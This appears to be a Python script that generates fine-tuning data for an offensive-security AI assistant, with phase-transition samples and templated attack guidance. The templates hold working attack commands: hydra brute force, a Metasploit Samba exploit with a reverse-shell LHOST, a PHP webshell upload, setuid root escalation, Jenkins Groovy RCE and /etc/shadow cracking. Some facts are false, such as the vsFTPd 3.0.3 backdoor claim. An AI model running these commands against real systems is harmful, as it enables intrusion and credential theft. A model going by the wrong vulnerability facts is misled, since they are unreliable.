#!/usr/bin/env python3
"""Phase 57 dataset augmentation.

Fixes three critical gaps in the training dataset:
  1. evidence_check: 13 → 500+ samples (from event files)
  2. retrieval_reasoning: 13 → 300+ samples (from postmortems + traces)
  3. next_step reasoning: strip decision-source leakage

Usage:
    python ariaska_ai/scripts/augment_dataset_p57.py [--dry-run] [--out-dir <path>]
"""

from __future__ import annotations

import argparse
import hashlib
import json
import logging
import random
import re
import sys
from pathlib import Path
from typing import Any

logging.basicConfig(level=logging.INFO, format="%(levelname)s %(message)s")
log = logging.getLogger("p57_augment")

PROJECT_ROOT = Path(__file__).resolve().parents[2]
TRACE_DIR = PROJECT_ROOT / "traces"
POSTMORTEM_DIR = PROJECT_ROOT / "postmortems"
DATASET_V2 = PROJECT_ROOT / "ariaska_ai" / "dataset" / "v2"

# ── Phase ordering for sufficiency inference ──────────────────────────────────

PHASE_ORDER = [
    "RECON", "ENUMERATION", "EXPLOITATION", "POST_EXPLOITATION",
    "LATERAL_MOVEMENT", "EXFILTRATION", "CLEANUP",
]
PHASE_IDX = {p: i for i, p in enumerate(PHASE_ORDER)}

# Evidence each phase needs BEFORE advancing
PHASE_PREREQS: dict[str, list[str]] = {
    "ENUMERATION": ["host_alive", "open_ports"],
    "EXPLOITATION": ["open_ports", "service_versions"],
    "POST_EXPLOITATION": ["remote_code_execution", "shell_access"],
    "LATERAL_MOVEMENT": ["user_creds", "shell_access"],
    "EXFILTRATION": ["data_access", "shell_access"],
    "CLEANUP": ["objectives_met"],
}

# Leakage patterns to strip from next_step reasoning
# Matches: "Using playbook: ", "Using ppo: ", "Using phase_gate_reasoning: ", etc.
# And: "scored well on discovery (22.0), novelty (12.5), base (8.0)"
_LEAKAGE_PATTERNS = [
    re.compile(r"\bUsing\s+[\w_]+\s*:\s*", re.I),
    re.compile(r"\bscored\s+well\s+on\s+[\w\s,.()\d]+", re.I),
    re.compile(r"\bppo\s*scored\s*:?\s*[\d.]+", re.I),
    re.compile(r"\bmentor\s*scored\s*:?\s*[\d.]+", re.I),
    re.compile(r"\bdecision_source\s*=\s*\w+", re.I),
]


# ── Helpers ──────────────────────────────────────────────────────────────────

def _sid(text: str) -> str:
    return hashlib.md5(text.encode()).hexdigest()[:10]


def _clean_reasoning(text: str) -> str:
    for p in _LEAKAGE_PATTERNS:
        text = p.sub("", text)
    return text.strip()


def _make_evidence_check(
    from_phase: str,
    to_phase: str,
    recent_actions: list[dict],
    target: str,
    step: int,
    episode_reward: float,
    source: str,
) -> dict | None:
    """Generate one evidence_check training sample."""
    from_idx = PHASE_IDX.get(from_phase, -1)
    to_idx = PHASE_IDX.get(to_phase, -1)
    if from_idx == -1 or to_idx == -1:
        return None

    # Infer sufficiency: advancing by 1 step after enough actions = sufficient
    # Premature skip (>1 phase jump in early steps) = insufficient
    jump = to_idx - from_idx
    prereqs = PHASE_PREREQS.get(to_phase, [])

    # Heuristic: if jump > 1 and step < 10, treat as insufficient
    # If jump == 1 and we have ≥3 actions with positive reward, treat as sufficient
    pos_reward_actions = [a for a in recent_actions if a.get("reward", 0) > 20]
    sufficient = (
        jump == 1
        and len(pos_reward_actions) >= 2
        and episode_reward > 50
        and step > 1
    )

    # Build missing list
    if sufficient:
        missing: list[str] = []
        confidence = round(random.uniform(0.75, 0.95), 2)
        recommendation = f"Proceed with {to_phase.lower().replace('_', ' ')} tactics"
    else:
        # Pick 1-2 prereqs as "missing"
        missing = prereqs[:2] if prereqs else ["more enumeration data"]
        confidence = round(random.uniform(0.2, 0.45), 2)
        recommendation = f"First obtain: {', '.join(missing)}"

    # Build user prompt
    actions_lines = []
    for a in recent_actions[-5:]:
        agent = a.get("agent_name", "Agent")
        cmd = a.get("command", "")[:80]
        rew = a.get("reward", 0)
        actions_lines.append(f"  {agent}: {cmd} (reward: {rew:.1f})")

    user_content = (
        f"Is the evidence sufficient to proceed?\n\n"
        f"Transition: {from_phase} → {to_phase}\n\n"
        f"Phase: {to_phase}\n"
        f"Target: {target or '10.10.x.x'}\n"
        f"Step: {step}/200\n"
        f"Episode reward so far: {episode_reward:.1f}\n"
        f"Recent actions:\n" + "\n".join(actions_lines)
    )

    asst_content = json.dumps({
        "sufficient": sufficient,
        "missing": missing,
        "confidence": confidence,
        "recommendation": recommendation,
    })

    return {
        "messages": [
            {
                "role": "system",
                "content": (
                    "You are Ariaska, a cybersecurity AI coprocessor. Given the current "
                    "evidence and target state, determine if the evidence is sufficient to "
                    "proceed. Respond in JSON:\n"
                    "{\"sufficient\": true|false, \"missing\": [\"<what's needed>\"], "
                    "\"confidence\": <0.0-1.0>, \"recommendation\": \"<brief>\"}"
                ),
            },
            {"role": "user", "content": user_content},
            {"role": "assistant", "content": asst_content},
        ],
        "task_family": "evidence_check",
        "metadata": {
            "from_phase": from_phase,
            "to_phase": to_phase,
            "sufficient": sufficient,
            "source": source,
            "augmented": True,
        },
        "quality_score": 0.82 if sufficient else 0.78,
    }


def _make_retrieval_reasoning(
    phase: str,
    current_state: str,
    prior_experience: str,
    synthesis: str,
    from_current: str,
    from_memory: str,
    action: str,
    confidence: float,
    source: str,
) -> dict:
    """Generate one retrieval_reasoning training sample."""
    user_content = (
        f"Current state:\n{current_state}\n\n"
        f"Prior experience: {prior_experience}\n\n"
        f"Synthesize guidance."
    )
    asst_content = json.dumps({
        "synthesis": synthesis,
        "from_current": from_current,
        "from_memory": from_memory,
        "action": action,
        "confidence": confidence,
    })

    return {
        "messages": [
            {
                "role": "system",
                "content": (
                    "You are Ariaska, a cybersecurity AI coprocessor. Using the current "
                    "state plus retrieved prior experience, synthesize tactical guidance. "
                    "Respond in JSON:\n"
                    "{\"synthesis\": \"<integrated reasoning>\", \"from_current\": "
                    "\"<what current state shows>\", \"from_memory\": \"<what prior "
                    "experience suggests>\", \"action\": \"<recommended command>\", "
                    "\"confidence\": <0.0-1.0>}"
                ),
            },
            {"role": "user", "content": user_content},
            {"role": "assistant", "content": asst_content},
        ],
        "task_family": "retrieval_reasoning",
        "metadata": {
            "phase": phase,
            "synthetic": True,
            "source": source,
            "augmented": True,
        },
        "quality_score": round(confidence * 0.9 + 0.05, 2),
    }


# ── evidence_check augmentation ───────────────────────────────────────────────

def augment_evidence_check(target: int = 500) -> list[dict]:
    """Extract phase transitions from old-format event files."""
    existing_file = DATASET_V2 / "evidence_check.jsonl"
    existing = []
    if existing_file.exists():
        with open(existing_file) as f:
            for line in f:
                line = line.strip()
                if line:
                    existing.append(json.loads(line))

    samples: list[dict] = []
    seen_ids: set[str] = set()

    event_files = sorted(TRACE_DIR.glob("events_*.jsonl"))
    log.info(f"Scanning {len(event_files)} event files for phase transitions...")

    for ef in event_files:
        if len(samples) + len(existing) >= target:
            break
        try:
            steps = []
            with open(ef) as f:
                for line in f:
                    line = line.strip()
                    if not line:
                        continue
                    d = json.loads(line)
                    if d.get("kind") == "step":
                        steps.append(d)

            # Accumulate running state — detect cross-step phase transitions
            cum_reward = 0.0
            all_actions: list[dict] = []
            prev_phase: str | None = None

            for step_data in steps:
                step_num = step_data.get("step_num", 0)
                phase_before = step_data.get("phase_before", "")
                target_ip = step_data.get("target_ip", "")
                step_reward = step_data.get("step_reward_total", 0)
                agent_records = step_data.get("agent_records", [])

                cum_reward += step_reward
                all_actions.extend(agent_records)

                # Transition = previous step's phase → this step's phase
                if prev_phase and phase_before and prev_phase != phase_before:
                    key = _sid(f"{ef.name}:{step_num}:{prev_phase}:{phase_before}")
                    if key not in seen_ids:
                        seen_ids.add(key)
                        sample = _make_evidence_check(
                            from_phase=prev_phase,
                            to_phase=phase_before,
                            recent_actions=all_actions[-8:],
                            target=target_ip,
                            step=step_num,
                            episode_reward=cum_reward,
                            source=ef.name,
                        )
                        if sample:
                            samples.append(sample)

                prev_phase = phase_before

        except (json.JSONDecodeError, OSError, KeyError):
            continue

    log.info(f"Generated {len(samples)} evidence_check samples (existing: {len(existing)})")
    return existing + samples


# ── retrieval_reasoning augmentation ─────────────────────────────────────────

# Tactical memory templates paired with common current-state patterns
_TEMPLATES: list[dict] = [
    {
        "phase": "RECON",
        "current_prefix": "Phase: RECON\nTarget: {ip}\nPorts: 22, 80",
        "prior": "Similar target had Apache on port 80 with /robots.txt disclosing /admin and /backup.",
        "synthesis": "HTTP on port 80 likely has exposed admin paths. Check robots.txt and common directories before deeper scanning.",
        "from_current": "SSH and HTTP are the primary attack surface; HTTP needs immediate investigation",
        "from_memory": "Apache targets with port 80 commonly expose sensitive paths via robots.txt",
        "action": "curl -s http://{ip}/robots.txt && gobuster dir -u http://{ip} -w /usr/share/seclists/Discovery/Web-Content/common.txt -q",
        "confidence": 0.82,
    },
    {
        "phase": "ENUMERATION",
        "current_prefix": "Phase: ENUMERATION\nTarget: {ip}\nPorts: 21, 22, 80\nServices: vsFTPd 3.0.3",
        "prior": "vsFTPd 3.0.3 is vulnerable to CVE-2011-2523 (backdoor) — connect to port 6200 after FTP connection.",
        "synthesis": "vsFTPd 3.0.3 has a known backdoor vulnerability. Trigger it via FTP then check port 6200 for shell.",
        "from_current": "FTP service running vsFTPd 3.0.3 — known vulnerable version",
        "from_memory": "vsFTPd 3.0.3 backdoor: send USER with :) smiley, then shell opens on port 6200",
        "action": "nmap --script ftp-vsftpd-backdoor -p 21 {ip}",
        "confidence": 0.91,
    },
    {
        "phase": "ENUMERATION",
        "current_prefix": "Phase: ENUMERATION\nTarget: {ip}\nPorts: 80, 443\nWeb: login page detected",
        "prior": "Similar web login used default credentials admin:admin — always try common defaults before bruteforce.",
        "synthesis": "Login pages often have default or weak credentials. Try common defaults before resource-intensive bruteforce.",
        "from_current": "Login form on port 80/443; authentication is the primary vector",
        "from_memory": "Previous targets with login forms: admin:admin, admin:password, admin:123456 succeeded 40% of the time",
        "action": "hydra -l admin -P /usr/share/wordlists/rockyou.txt {ip} http-post-form '/login:username=^USER^&password=^PASS^:Invalid' -t 4",
        "confidence": 0.76,
    },
    {
        "phase": "EXPLOITATION",
        "current_prefix": "Phase: EXPLOITATION\nTarget: {ip}\nPorts: 445\nServices: SMB Samba 3.x",
        "prior": "Samba 3.x with usermap_script (MS08-067 equivalent for Linux) — use Metasploit module exploit/multi/samba/usermap_script.",
        "synthesis": "Samba 3.x on Linux is likely vulnerable to usermap_script RCE. This gives root directly.",
        "from_current": "SMB on port 445 running old Samba version — classic Metasploitable2 pattern",
        "from_memory": "exploit/multi/samba/usermap_script reliably roots Samba 3.x targets in one step",
        "action": "msfconsole -q -x 'use exploit/multi/samba/usermap_script; set RHOSTS {ip}; set LHOST {lhost}; run'",
        "confidence": 0.93,
    },
    {
        "phase": "EXPLOITATION",
        "current_prefix": "Phase: EXPLOITATION\nTarget: {ip}\nPorts: 80\nWeb: PHP file upload form found",
        "prior": "PHP file upload with no MIME validation — upload webshell.php, navigate to upload dir.",
        "synthesis": "PHP upload forms without validation allow direct webshell upload. Upload PHP, get RCE.",
        "from_current": "File upload form detected; PHP execution likely if extension check is missing",
        "from_memory": "PHP webshell upload pattern: upload cmd.php, access /uploads/cmd.php?cmd=id",
        "action": "curl -F 'file=@/tmp/shell.php;type=image/jpeg' http://{ip}/upload.php && curl http://{ip}/uploads/shell.php?cmd=id",
        "confidence": 0.85,
    },
    {
        "phase": "POST_EXPLOITATION",
        "current_prefix": "Phase: POST_EXPLOITATION\nTarget: {ip}\nShell: www-data\nOS: Linux",
        "prior": "www-data → root via dirty cow or SUID find. Check kernel version first.",
        "synthesis": "Low-privilege www-data shell needs privesc. SUID find is the fastest path; check kernel for dirtycow fallback.",
        "from_current": "www-data shell on Linux — need to escalate to root for full access",
        "from_memory": "SUID find: `find / -perm -u=s -type f 2>/dev/null`; if find is SUID use `find . -exec /bin/sh \\;`",
        "action": "find / -perm -u=s -type f 2>/dev/null | grep -v proc",
        "confidence": 0.88,
    },
    {
        "phase": "POST_EXPLOITATION",
        "current_prefix": "Phase: POST_EXPLOITATION\nTarget: {ip}\nShell: user\nOS: Linux Ubuntu 20.04",
        "prior": "Python3 cap_setuid capability allows setuid(0) and exec /bin/bash — instant root.",
        "synthesis": "Python3 with cap_setuid capability bypasses standard SUID checks. One-liner gives root.",
        "from_current": "User shell on Ubuntu 20.04; capabilities may be misconfigured",
        "from_memory": "HTB Cap machine: python3.8 has cap_setuid. Use: python3 -c \"import os; os.setuid(0); os.system('/bin/bash')\"",
        "action": "python3 -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'",
        "confidence": 0.95,
    },
    {
        "phase": "ENUMERATION",
        "current_prefix": "Phase: ENUMERATION\nTarget: {ip}\nPorts: 3306\nServices: MySQL",
        "prior": "MySQL on external port often has root with empty password or default creds.",
        "synthesis": "Externally exposed MySQL suggests weak credentials. Try root with no password first.",
        "from_current": "MySQL port 3306 exposed externally — unusual and likely misconfigured",
        "from_memory": "mysql -h target -u root with empty password succeeds on ~30% of CTF targets",
        "action": "mysql -h {ip} -u root --password='' -e 'show databases;' 2>/dev/null || mysql -h {ip} -u root -proot -e 'show databases;'",
        "confidence": 0.73,
    },
    {
        "phase": "RECON",
        "current_prefix": "Phase: RECON\nTarget: {ip}\nPorts: 22, 2222",
        "prior": "Non-standard SSH port 2222 sometimes runs older vulnerable OpenSSH version.",
        "synthesis": "Check SSH version on both ports — the non-standard port may be an older install with different config.",
        "from_current": "Two SSH ports; 2222 is likely a secondary or legacy SSH service",
        "from_memory": "Dual SSH setups sometimes expose debug/test configs with permissive auth on the secondary port",
        "action": "ssh -p 2222 -o ConnectTimeout=5 root@{ip} 2>&1 | head -5 && nmap -sV -p 2222 {ip}",
        "confidence": 0.68,
    },
    {
        "phase": "EXPLOITATION",
        "current_prefix": "Phase: EXPLOITATION\nTarget: {ip}\nPorts: 8080\nWeb: Jenkins login",
        "prior": "Jenkins default creds admin:password or blank. Groovy script console gives RCE.",
        "synthesis": "Jenkins admin access via Groovy console provides direct OS command execution.",
        "from_current": "Jenkins on port 8080 — common misconfiguration with default credentials",
        "from_memory": "Jenkins RCE: Script Console → Groovy: 'cmd.exe /c whoami'.execute().text (Windows) or ['id'].execute().text (Linux)",
        "action": "curl -u admin:password http://{ip}:8080/script -d 'script=[\"id\",\"whoami\"].execute().text'",
        "confidence": 0.87,
    },
    {
        "phase": "POST_EXPLOITATION",
        "current_prefix": "Phase: POST_EXPLOITATION\nTarget: {ip}\nShell: root\nSensitive: /etc/shadow found",
        "prior": "John the Ripper with rockyou.txt cracks common shadow hashes in minutes.",
        "synthesis": "Root access + shadow file = crack all hashes for lateral movement credentials.",
        "from_current": "Root shell obtained; /etc/shadow gives all user hashes for offline cracking",
        "from_memory": "Unshadow + john: `unshadow /etc/passwd /etc/shadow > hashes.txt && john --wordlist=rockyou.txt hashes.txt`",
        "action": "unshadow /etc/passwd /etc/shadow > /tmp/hashes.txt && john --wordlist=/usr/share/wordlists/rockyou.txt /tmp/hashes.txt",
        "confidence": 0.82,
    },
    {
        "phase": "ENUMERATION",
        "current_prefix": "Phase: ENUMERATION\nTarget: {ip}\nPorts: 139, 445\nServices: SMB",
        "prior": "SMB null session enumeration reveals shares and user lists on older Windows/Samba.",
        "synthesis": "SMB null sessions expose shares and users without credentials. Always enumerate before exploiting.",
        "from_current": "SMB ports open; null session enumeration is low-risk first step",
        "from_memory": "enum4linux -a target gives shares, users, groups, password policy in one run",
        "action": "enum4linux -a {ip} 2>/dev/null | tee /tmp/smb_enum.txt",
        "confidence": 0.84,
    },
]

_IPS = ["10.10.10.5", "10.129.5.115", "192.168.1.100", "172.28.0.10", "10.10.11.42"]
_LHOSTS = ["10.10.14.1", "10.10.14.5", "192.168.1.50"]


def augment_retrieval_reasoning(
    target: int = 300,
    postmortem_budget: int = 200,
) -> list[dict]:
    """Generate retrieval_reasoning samples from templates + postmortem skill_cards."""
    existing_file = DATASET_V2 / "retrieval_reasoning.jsonl"
    existing = []
    if existing_file.exists():
        with open(existing_file) as f:
            for line in f:
                line = line.strip()
                if line:
                    existing.append(json.loads(line))

    samples: list[dict] = []
    rng = random.Random(42)

    # 1. Template-based (multiple IPs)
    for tmpl in _TEMPLATES:
        for ip in _IPS:
            lhost = rng.choice(_LHOSTS)
            def fmt(s: str) -> str:
                return s.format(ip=ip, lhost=lhost)

            sample = _make_retrieval_reasoning(
                phase=tmpl["phase"],
                current_state=fmt(tmpl["current_prefix"]),
                prior_experience=tmpl["prior"],
                synthesis=tmpl["synthesis"],
                from_current=fmt(tmpl["from_current"]) if "{ip}" in tmpl.get("from_current", "") else tmpl["from_current"],
                from_memory=tmpl["from_memory"],
                action=fmt(tmpl["action"]),
                confidence=tmpl["confidence"],
                source="template_p57",
            )
            samples.append(sample)
            if len(existing) + len(samples) >= target:
                break
        if len(existing) + len(samples) >= target:
            break

    # 2. Postmortem skill_card based
    pm_files = sorted(POSTMORTEM_DIR.glob("postmortem_*.json"))
    rng.shuffle(pm_files)
    pm_count = 0

    for pf in pm_files:
        if pm_count >= postmortem_budget:
            break
        if len(existing) + len(samples) >= target:
            break
        try:
            with open(pf) as f:
                pm = json.load(f)
            if pm.get("model_used") == "offline":
                continue

            for skill in pm.get("skill_cards", []):
                if_cond = skill.get("if_condition", "")
                then_act = skill.get("then_action", "")
                confidence = skill.get("confidence", 0.5)
                phases = skill.get("applicable_phases", ["RECON"])

                if not if_cond or not then_act or confidence < 0.4:
                    continue

                phase = phases[0] if phases else "RECON"
                ip = rng.choice(_IPS)

                current_state = (
                    f"Phase: {phase}\nTarget: {ip}\n"
                    f"Condition: {if_cond[:200]}"
                )
                prior_exp = f"Prior run {pm.get('run_id', 'unknown')}: {if_cond[:150]} → {then_act[:150]}"

                sample = _make_retrieval_reasoning(
                    phase=phase,
                    current_state=current_state,
                    prior_experience=prior_exp,
                    synthesis=f"Pattern detected: {if_cond[:100]}. Apply: {then_act[:100]}",
                    from_current=f"Current state matches condition: {if_cond[:80]}",
                    from_memory=f"Prior successful pattern: {then_act[:100]}",
                    action=then_act[:200],
                    confidence=min(confidence, 0.95),
                    source=pf.name,
                )
                samples.append(sample)
                pm_count += 1
                if len(existing) + len(samples) >= target:
                    break

        except (json.JSONDecodeError, OSError, KeyError):
            continue

    log.info(f"Generated {len(samples)} retrieval_reasoning samples (existing: {len(existing)})")
    return existing + samples


# ── next_step leakage cleaning ─────────────────────────────────────────────────

def clean_next_step() -> tuple[int, int]:
    """Strip decision-source leakage from next_step.jsonl. Returns (total, cleaned)."""
    ns_file = DATASET_V2 / "next_step.jsonl"
    if not ns_file.exists():
        log.warning("next_step.jsonl not found")
        return 0, 0

    total = 0
    cleaned = 0
    output_lines: list[str] = []

    with open(ns_file) as f:
        for line in f:
            line = line.strip()
            if not line:
                continue
            total += 1
            try:
                sample = json.loads(line)
            except json.JSONDecodeError:
                output_lines.append(line)
                continue

            modified = False
            for msg in sample.get("messages", []):
                if msg.get("role") == "assistant":
                    content = msg.get("content", "")
                    # Try to parse as JSON and clean reasoning field
                    try:
                        asst = json.loads(content)
                        reasoning = asst.get("reasoning", "")
                        cleaned_reasoning = _clean_reasoning(reasoning)
                        if cleaned_reasoning != reasoning:
                            asst["reasoning"] = cleaned_reasoning
                            msg["content"] = json.dumps(asst)
                            modified = True
                    except (json.JSONDecodeError, AttributeError):
                        # Not JSON — clean raw text
                        new_content = _clean_reasoning(content)
                        if new_content != content:
                            msg["content"] = new_content
                            modified = True

            output_lines.append(json.dumps(sample))
            if modified:
                cleaned += 1

    # Rewrite
    ns_file.write_text("\n".join(output_lines) + "\n")
    return total, cleaned


# ── Train/val/holdout split ───────────────────────────────────────────────────

def write_split(
    samples: list[dict],
    out_file: Path,
    label: str,
) -> None:
    """Append samples to the given file (new samples only — avoid duplicates)."""
    out_file.parent.mkdir(parents=True, exist_ok=True)
    with open(out_file, "w") as f:
        for s in samples:
            f.write(json.dumps(s) + "\n")
    log.info(f"Wrote {len(samples)} {label} samples → {out_file}")


def rebuild_train_val(out_dir: Path) -> dict:
    """Rebuild train.jsonl by concatenating all task family files, then split."""
    all_samples: list[dict] = []
    task_files = [
        "command_validate.jsonl", "evidence_check.jsonl", "next_step.jsonl",
        "phase_classification.jsonl", "postmortem.jsonl", "retrieval_reasoning.jsonl",
        "retry_or_pivot.jsonl", "state_summary.jsonl", "tool_output_parse.jsonl",
    ]
    per_family: dict[str, int] = {}
    for tf in task_files:
        fp = out_dir / tf
        if not fp.exists():
            continue
        count = 0
        with open(fp) as f:
            for line in f:
                line = line.strip()
                if line:
                    all_samples.append(json.loads(line))
                    count += 1
        per_family[tf.replace(".jsonl", "")] = count

    rng = random.Random(2026)
    rng.shuffle(all_samples)
    n = len(all_samples)
    val_n = max(1, int(n * 0.10))
    holdout_n = max(1, int(n * 0.10))
    train_n = n - val_n - holdout_n

    # Don't touch holdout if it already exists from original extraction
    holdout_file = out_dir / "holdout.jsonl"
    if holdout_file.exists():
        # Preserve existing holdout, only rebuild train + val
        train = all_samples[:train_n + holdout_n]
        val = all_samples[train_n + holdout_n:]
        with open(out_dir / "train.jsonl", "w") as f:
            for s in train:
                f.write(json.dumps(s) + "\n")
        with open(out_dir / "val.jsonl", "w") as f:
            for s in val:
                f.write(json.dumps(s) + "\n")
        log.info(f"Rebuilt train.jsonl ({len(train)}) and val.jsonl ({len(val)})")
    else:
        train = all_samples[:train_n]
        val = all_samples[train_n:train_n + val_n]
        holdout = all_samples[train_n + val_n:]
        with open(out_dir / "train.jsonl", "w") as f:
            for s in train:
                f.write(json.dumps(s) + "\n")
        with open(out_dir / "val.jsonl", "w") as f:
            for s in val:
                f.write(json.dumps(s) + "\n")
        with open(holdout_file, "w") as f:
            for s in holdout:
                f.write(json.dumps(s) + "\n")

    # Update stats
    stats = {
        "total_samples": n,
        "train": len(train),
        "val": len(val),
        "per_task": {k: {"total": v} for k, v in per_family.items()},
    }
    (out_dir / "dataset_stats.json").write_text(json.dumps(stats, indent=2))
    return stats


# ── Main ──────────────────────────────────────────────────────────────────────

def main() -> None:
    parser = argparse.ArgumentParser(description="Phase 57 dataset augmentation")
    parser.add_argument("--dry-run", action="store_true", help="Print stats, don't write")
    parser.add_argument("--out-dir", default=str(DATASET_V2), help="Dataset output directory")
    parser.add_argument("--evidence-target", type=int, default=500)
    parser.add_argument("--retrieval-target", type=int, default=300)
    parser.add_argument("--skip-clean", action="store_true", help="Skip next_step cleaning")
    parser.add_argument("--skip-rebuild", action="store_true", help="Skip train/val rebuild")
    args = parser.parse_args()

    out_dir = Path(args.out_dir)

    # 1. evidence_check augmentation
    ec_samples = augment_evidence_check(target=args.evidence_target)
    log.info(f"evidence_check total: {len(ec_samples)}")
    if not args.dry_run:
        write_split(ec_samples, out_dir / "evidence_check.jsonl", "evidence_check")

    # 2. retrieval_reasoning augmentation
    rr_samples = augment_retrieval_reasoning(target=args.retrieval_target)
    log.info(f"retrieval_reasoning total: {len(rr_samples)}")
    if not args.dry_run:
        write_split(rr_samples, out_dir / "retrieval_reasoning.jsonl", "retrieval_reasoning")

    # 3. Clean next_step leakage
    if not args.skip_clean:
        total, cleaned = clean_next_step()
        log.info(f"next_step: cleaned {cleaned}/{total} samples (removed leakage)")
    else:
        log.info("next_step cleaning skipped")

    # 4. Rebuild train/val splits
    if not args.skip_rebuild and not args.dry_run:
        stats = rebuild_train_val(out_dir)
        log.info(f"Dataset rebuilt: {stats['total_samples']} total, {stats['train']} train, {stats['val']} val")
        log.info("Per-family counts:")
        for fam, cnt in stats.get("per_task", {}).items():
            log.info(f"  {fam}: {cnt['total']}")
    elif args.dry_run:
        log.info("[DRY RUN] No files written")


if __name__ == "__main__":
    main()
